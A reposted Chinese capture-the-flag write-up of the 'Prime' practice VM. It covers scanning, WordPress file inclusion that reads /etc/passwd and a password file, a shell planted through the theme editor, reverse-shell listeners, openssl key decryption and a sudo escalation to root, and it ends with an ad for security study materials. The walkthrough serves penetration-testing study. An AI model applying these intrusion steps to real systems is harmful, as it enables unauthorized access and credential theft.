# 转载
：  Prime 打靶记录

# Prime 打靶记录

### 总体思路

### nmap扫描

#### 端口信息扫描

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

```

#### 开放端口及系统详细信息扫描

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8dc52023ab10cadee2fbe5cd4d2d4d72 (RSA)
|   256 949cf86f5cf14c11957f0a2c3476500b (ECDSA)
|_  256 4bf6f125b61326d4fc9eb0729ff46968 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: HacknPentest
MAC Address: 00:0C:29:EB:A5:7C (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

#### 简单脚本扫描

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| http-enum: 
|   /wordpress/: Blog
|_  /wordpress/wp-login.php: Wordpress login page.
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-csrf: Couldn't find any CSRF vulnerabilities.
MAC Address: 00:0C:29:EB:A5:7C (VMware)

```

### nmap结果分析及渗透优先级排序

只有web和ssh，毫无疑问，Web--&gt;ssh<br/> Web可能是Wordpress内容管理系统，Apache httpd 2.4.18。<br/> ssh是OpenSSH 7.2p2。

### Web渗透

#### 页面信息检索

只有一张图片，刚刚nmap探测可能是Wordpress，尝试访问。<br/>  

<br/> 确实是wordpress，而且还发现一个victor用户。

#### 目录暴破

```
# gobuster dir -u "http://192.168.137.146/" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.txt,.tar,.zip
===============================================================
Gobuster v3.4
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.137.146/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.4
[+] Extensions:              php,txt,tar,zip
[+] Timeout:                 10s
===============================================================
2023/11/10 14:50:16 Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 294]
/index.php            (Status: 200) [Size: 136]
/image.php            (Status: 200) [Size: 147]
/wordpress            (Status: 301) [Size: 322] [--&gt; http://192.168.137.146/wordpress/]                                                                                    /dev                  (Status: 200) [Size: 131]
/javascript           (Status: 301) [Size: 323] [--&gt; http://192.168.137.146/javascript/]
/secret.txt           (Status: 200) [Size: 412]
/.php                 (Status: 403) [Size: 294]
/server-status        (Status: 403) [Size: 303]
Progress: 1094876 / 1102805 (99.28%)

```

发现的文件逐一访问，访问到`/secret.txt`时，发现提示:

#### Wfuzz

根据提示，在`http://192.168.137.146/index.php`使用Fuzz技术

```
# wfuzz -c -w /usr/share/wfuzz/wordlist/general/common.txt --hw=12 "http://192.168.137.146/index.php?FUZZ=aaaa"
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.137.146/index.php?FUZZ=aaaa
Total requests: 951

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000341:   200        7 L      19 W       206 Ch      "file"

Total time: 0.611152
Processed Requests: 951
Filtered Requests: 950
Requests/sec.: 1556.076

```

发现`file`参数。包含并访问`http://192.168.137.146/index.php?file=location.txt`<br/>  

<br/> 根据提示，尝试刚刚的另一个php页面，也就是`/image.php`，访问`http://192.168.137.146/image.php?secrettier360=/etc/passwd`，发现可以进行文件包含。<br/>  

<br/> 发现用户`victor`和`saket`。仔细看，会发现提示：<br/>  

<br/> 那么利用文件包含去查看password.txt<br/>  

<br/> 得到密码：`follow_the_ippsec`。<br/> 当然，在此之前我尝试了利用文件包含去包含了一些系统敏感信息，ssh私钥等。都无进展。<br/> 此处我想到了ssh进行登录，后来发现登不进去。于是尝试了wordpress的后台登陆。登陆成功。

### getshell

#### wordpress渗透

拿到wordpress的后台之后，通常有常规的两种getshell思路：
1.  上传插件的地方进行文件上传。 1.  找到可以进行修改php文件的地方写入shell。通常是主题编辑那里。 
文件上换那里我试了一下没成功。但是找到了可以更改的php文件，写入了shell。

去网上找了一下路径，最终访问`http://192.168.137.146/wordpress/wp-content/themes/twentynineteen/secret.php`获得了初始立足点。

```
# nc -lvnp 8081
listening on [any] 8081 ...
connect to [192.168.137.135] from (UNKNOWN) [192.168.137.146] 39296
Linux ubuntu 4.10.0-28-generic #32~16.04.2-Ubuntu SMP Thu Jul 20 10:19:48 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
 21:29:39 up 35 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami 
www-data
$

```

### 提权

sudo -l发现有可以执行的脚本enc，但是需要密码。<br/> 那么尝试find密码或者备份文件之类的。<br/> 最终，`/opt/backup/server_database/backup_pass`发现密码。<br/> 继续去执行enc。发现生成了`enc.txt`和`key.txt`。看到这两个文件名，我想到了openssl解密。在目标靶机上用python开启http的8000端口服务：

```
www-data@ubuntu:/$ python3 -m http.server
python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 ...

```

然后我们就可以下载到enc.txt和key.txt文件了。

#### Openssl解密

##### 补充一下Openssl的知识

Openssl是个工具，里面有包括很多模块。其中enc模块可以用于加解密。<br/> 解密：<br/>`openssl enc -d -a -ciphername -K key`<br/> -d 进行解密。<br/> -a：当进行加解密时，需要解密的内容可能需要进行base64转换。设置此选项后，加密结果进行base64编码；解密前先进行base64解码。<br/> -ciphername：算法名字<br/> -K key：用的实际密钥值：这个必须被提出，它是一个16进制的输入口令。因为需要16进制，尝尝需要od命令配合。

加密：<br/>`openssl passwd -1 123456`执行该命令会生成一个形如`$1$salt$hash`的密码哈希值，其中salt是随机生成的盐值，hash是根据密码和盐值计算出的哈希值。linux密码就是这样的算法。<br/> "openssl"是一个用于生成和管理安全证书、密钥和密码的开放源代码工具。<br/> "passwd"是OpenSSL工具的一个子命令，用于生成密码散列。<br/> "-1"是一个选项参数，指定使用MD5算法生成密码散列。这个选项也被称为"md5"选项。<br/> "123456"是要加密的原始密码。这里使用了一个示例密码"123456"，您可以替换为您自己的密码。

##### 解密

enc.txt:

```
# cat ./enc.txt
nzE+iKr82Kh8BOQg0k/LViTZJup+9DReAsXd/PCtFZP5FHM7WtJ9Nz1NmqMi9G0i7rGIvhK2jRcGnFyWDT9MLoJvY1gZKI2xsUuS3nJ/n3T1Pe//4kKId+B3wfDW/TgqX6Hg/kUj8JO08wGe9JxtOEJ6XJA3cO/cSna9v3YVf/ssHTbXkb+bFgY7WLdHJyvF6lD/wfpY2ZnA1787ajtm+/aWWVMxDOwKuqIT1ZZ0Nw4=

```

像是bash64编了码。因此，一会解密需要带上`-a`或者`-base64`。<br/> key.txt:

```
# cat ./key.txt
I know you are the fan of ippsec.

So convert string "ippsec" into md5 hash and use it to gain yourself in your real form.

```

根据他说的，我们将ippsec去md5之后就是需要的key。

```
# echo "ippsec" | tr -d '\n' | md5sum | awk -F " " '{print $1}' | tr -d '\n' | od -A n -t x1 | tr -d ' ' | tr -d '\n'
3336366137346362336339353964653137643631646233303539316333396431

```

以防可能存在换行符影响最终的hash值，我每个操作都将换行符删了，并且使用od转换为了16进制（因为Openssl的Key需要16进制）。<br/> 现在得到了要解密的东西，得到了需要的Key。但是不知道用什么解密算法进行解密。那么我尝试直接写个循环，将所有openssl支持的解密算法全部尝试一遍。最终命令如下：

```
# for type in $(cat ./type);do echo "nzE+iKr82Kh8BOQg0k/LViTZJup+9DReAsXd/PCtFZP5FHM7WtJ9Nz1NmqMi9G0i7rGIvhK2jRcGnFyWDT9MLoJvY1gZKI2xsUuS3nJ/n3T1Pe//4kKId+B3wfDW/TgqX6Hg
/kUj8JO08wGe9JxtOEJ6XJA3cO/cSna9v3YVf/ssHTbXkb+bFgY7WLdHJyvF6lD/wfpY2ZnA1787ajtm+/aWWVMxDOwKuqIT1ZZ0Nw4=" | openssl enc -d -a $type -K 333636613734636233633935396465313764
3631646233303539316333396431 2&gt;/dev/null;done;

```

其中，`./type`文件里的内容`openssl enc -list`的内容，这是全部支持的解密算法。<br/> 结果如下：<br/>  

<br/> 我们得到了saket的密码：`tribute_to_ippsec`。<br/> 尝试ssh进行登录，得到了saket的shell：

```
# ssh saket@192.168.137.146 
saket@192.168.137.146's password: 
Welcome to Ubuntu 16.04.3 LTS (GNU/Linux 4.10.0-28-generic x86_64)
Last login: Sat Nov 11 00:22:37 2023 from 192.168.137.135
$ whoami
saket
$

```

#### 二次提权

现在的saket还不是root权限。需要进一步提权。<br/> 常规便利之后，发现sudo -l里可以执行脚本，但是执行之后提示缺少文件。很明显，此处是root用户的权限进行执行，那么如果我们创建缺少的文件，并且将shell写入。那么就会提权成功。<br/> 写入反弹shell，本地8082jian'l再次执行，最终提权成功。

```
# nc -lvnp 8082
listening on [any] 8082 ...
connect to [192.168.137.135] from (UNKNOWN) [192.168.137.146] 55324
root@ubuntu:~# whoami
whoami
root
root@ubuntu:~#

```

### 靶机总结与认知成长
1.  php文件的地方最好可以进行Fuzz，看有没有存在的传参。 1.  针对wordpress的渗透，拿到后台之后，首先要想到两件事，一是上传，二是插php的shell。 1.  进入系统之后，find时，需要对.bak或者password等关键词进行搜索，特别是用户多的机器。 1.  Openssl解密需要注意。 
```
原文链接：https://www.freebuf.com/articles/network/383588.html
```

## **免费领取安全学习资料包！**<img alt="" height="768" src="https://img-blog.csdnimg.cn/direct/d56147efd9dd4649a018d39fa7bf1dae.png" width="1024"/>

渗透工具

技术文档、书籍

<img alt="" height="516" src="https://img-blog.csdnimg.cn/direct/3fe0ce8bf8d048339883447e608f9fd1.png" width="852"/> <img alt="" height="523" src="https://img-blog.csdnimg.cn/direct/3d7825649fda4895b0dc5eb4618d570a.png" width="856"/>

面试题

帮助你在面试中脱颖而出

视频

基础到进阶

环境搭建、HTML，PHP，MySQL基础学习，信息收集，SQL注入,XSS，CSRF，暴力破解等等

<img alt="" height="481" src="https://img-blog.csdnimg.cn/direct/e584ddac1be84d868fc79e513af776e1.png" width="694"/> <img alt="" height="77" src="https://img-blog.csdnimg.cn/direct/d64cb7b6bf454890a496b8457f0e9bb0.png" width="665"/>

应急响应笔记

学习路线
